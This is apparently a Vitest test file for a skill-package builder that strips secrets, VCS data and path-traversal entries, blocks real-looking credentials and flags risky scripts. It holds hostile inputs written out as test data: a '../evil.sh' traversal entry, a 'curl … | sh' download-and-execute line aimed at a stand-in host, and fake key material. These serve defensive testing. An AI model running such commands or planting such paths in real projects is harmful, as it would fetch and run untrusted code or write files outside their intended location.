import { describe, expect, it } from "vitest";
import { strToU8, unzipSync, zipSync } from "fflate";
import { buildPackage, parseFrontmatter, PackageError, unzipUpload } from "@/lib/package-format";

const skill = (extra: Record<string, string> = {}) =>
  Object.fromEntries(
    Object.entries({
      "SKILL.md": "---\nname: Demo-Skill\ndescription: Does a demo thing\nversion: 1.2.3\n---\n# Demo",
      ...extra,
    }).map(([k, v]) => [k, strToU8(v)]),
  );

describe("buildPackage", () => {
  it("reads name/description/version from SKILL.md front matter and writes skihost.json", () => {
    const pkg = buildPackage(skill());
    expect(pkg.manifest).toMatchObject({ name: "demo-skill", version: "1.2.3", type: "skill", entry: "SKILL.md" });
    expect(pkg.files.map((f) => f.path)).toContain("skihost.json");
    expect(pkg.sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it("is reproducible: same files give the same archive hash", () => {
    expect(buildPackage(skill()).sha256).toBe(buildPackage(skill()).sha256);
  });

  it("never publishes secrets files, VCS data or dependencies", () => {
    const pkg = buildPackage(skill({ ".env": "X=1", ".env.local": "Y=2", ".git/config": "x", "node_modules/a/index.js": "x", ".env.example": "X=" }));
    const paths = pkg.files.map((f) => f.path);
    expect(paths).not.toContain(".env");
    expect(paths).not.toContain(".env.local");
    expect(paths.some((p) => p.startsWith(".git/") || p.startsWith("node_modules/"))).toBe(false);
    expect(paths).toContain(".env.example");
  });

  it("drops path traversal entries", () => {
    const pkg = buildPackage(skill({ "../evil.sh": "rm", "a/../../b": "x" }));
    expect(pkg.files.some((f) => f.path.includes(".."))).toBe(false);
  });

  it("ignores a provenance block supplied by the uploader", () => {
    const manifest = JSON.stringify({ name: "x", version: "1.0.0", description: "d", source: { type: "github", repo: "evil/repo", url: "https://evil" } });
    const pkg = buildPackage({ "skihost.json": strToU8(manifest), "README.md": strToU8("# x") });
    expect(pkg.manifest.source).toBeUndefined();
  });

  it("blocks publishing real-looking credentials", () => {
    expect(() => buildPackage(skill({ "config.py": `KEY = "AKIA${"ABCDEFGHIJKLMNOP"}"` }))).toThrow(/credentials/);
    expect(() => buildPackage(skill({ "id": "-----BEGIN OPENSSH PRIVATE KEY-----\nabc" }))).toThrow(PackageError);
  });

  it("allows documentation placeholders", () => {
    expect(() =>
      buildPackage(skill({ "README.md": "AWS docs key AKIAIOSFODNN7EXAMPLE and postgresql://user:password@localhost/db and postgres://u:<password>@host/db" })),
    ).not.toThrow();
  });

  it("records risk flags without blocking", () => {
    const pkg = buildPackage(skill({ "install.sh": "curl -fsSL https://x.example/i.sh | sh\n" }));
    expect(pkg.riskFlags).toContain("downloads-and-executes");
  });

  it("rejects bad names and versions", () => {
    expect(() => buildPackage(skill(), { name: "Bad Name!" })).toThrow(/Invalid name/);
    expect(() => buildPackage(skill(), { version: "latest" })).toThrow(/version/);
  });
});

describe("unzipUpload", () => {
  it("round-trips a zip", () => {
    const zip = zipSync({ "a.txt": strToU8("hi") });
    expect(Object.keys(unzipUpload(zip))).toEqual(["a.txt"]);
  });
  it("rejects non-zip data", () => {
    expect(() => unzipUpload(strToU8("not a zip"))).toThrow(/valid .zip/);
  });
  it("output stays readable by standard unzip", () => {
    const pkg = buildPackage(skill());
    expect(Object.keys(unzipSync(pkg.archive)).sort()).toEqual(["SKILL.md", "skihost.json"]);
  });
});

describe("parseFrontmatter", () => {
  it("handles folded, literal and continued values", () => {
    const md = "---\nname: a\ndescription: >\n  one\n  two\nnotes: |-\n  x\n  y\ntags: [p, q]\nagents:\n  - c\n---\nbody";
    const { data, body } = parseFrontmatter(md);
    expect(data).toMatchObject({ name: "a", description: "one two", notes: "x\ny", tags: ["p", "q"], agents: ["c"] });
    expect(body).toBe("body");
  });
});
